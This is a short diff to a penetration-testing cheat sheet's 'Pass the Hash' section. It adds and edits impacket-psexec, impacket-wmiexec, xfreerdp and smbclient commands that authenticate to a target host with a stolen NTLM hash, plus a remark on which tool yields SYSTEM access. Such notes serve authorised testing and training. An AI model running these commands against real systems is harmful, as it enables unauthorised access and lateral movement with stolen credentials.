@@ -4230,10 +4230,12 @@ Enter-PSSession 1
 ###### Pass the Hash (PtH)
 
 ```c
-impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
+impacket-psexec -hashes :<HASH> Administrator@<RHOST>
+impacket-wmiexec -hashes :<HASH> Administrator@<RHOST>
 xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
 smbclient \\\\<RHOST>\\<SMB-Path> -U <USERNAME> --pw-nt-hash <hash>
 ```
+- using psexec will login as system where as wmiexec will be administrator
 
 ###### Overpass the Hash
 
